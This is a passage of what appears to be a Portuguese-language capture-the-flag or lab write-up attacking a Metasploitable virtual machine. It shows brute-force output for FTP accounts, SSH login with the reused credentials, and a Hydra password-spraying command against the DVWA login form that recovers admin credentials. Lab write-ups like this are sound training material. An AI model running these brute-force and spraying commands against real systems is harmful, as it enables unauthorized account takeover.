2025-09-30 18:40:52 ACCOUNT FOUND: [ftp] Host: 192.168.56.109 User: ftp Password: AaA [SUCCESS]
2025-09-30 18:40:52 ACCOUNT FOUND: [ftp] Host: 192.168.56.109 User: ftp Password: abilities [SUCCESS]
2025-09-30 18:40:52 ACCOUNT FOUND: [ftp] Host: 192.168.56.109 User: ftp Password: ability [SUCCESS]

```

Agora, eu posso tentar esse par de senhas em todos os serviços disponíveis, não só no FTP. Posso tentar no smb, ssh e na aplicação web.

Exemplo:
```bash
┌──(kali㉿kali)-[~/desafio]
└─$ ssh user@192.168.56.109         
Unable to negotiate with 192.168.56.109 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
                                                                                                                  
┌──(kali㉿kali)-[~/desafio]
└─$ ssh -o HostKeyAlgorithms=+ssh-rsa -o PubKeyAcceptedKeyTypes=+ssh-rsa user@192.168.56.109                     
The authenticity of host '192.168.56.109 (192.168.56.109)' can't be established.
RSA key fingerprint is SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.109' (RSA) to the list of known hosts.
user@192.168.56.109's password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
user@metasploitable:~$ 

```


Realizando um password spraying com hydra, obtemos as credenciais do admin

```bash
┌──(kali㉿kali)-[~/desafio]  
└─$ hydra -L user.txt -p 'password' -s 80 192.168.56.109 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
  
Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) starting at 2025-09-30 20:10:45  
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task  
[DATA] attacking http-post-form://[192.168.56.109:80/dvwa/login.php:username=](http://192.168.56.109/dvwa/login.php:username=)^USER^&password=^PASS^&Login=Login:F=Login failed  
[80][http-post-form] host: 192.168.56.109   login: admin   password: password  
1 of 1 target successfully completed, 1 valid password found  
Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) finished at 2025-09-30 20:10:46
```

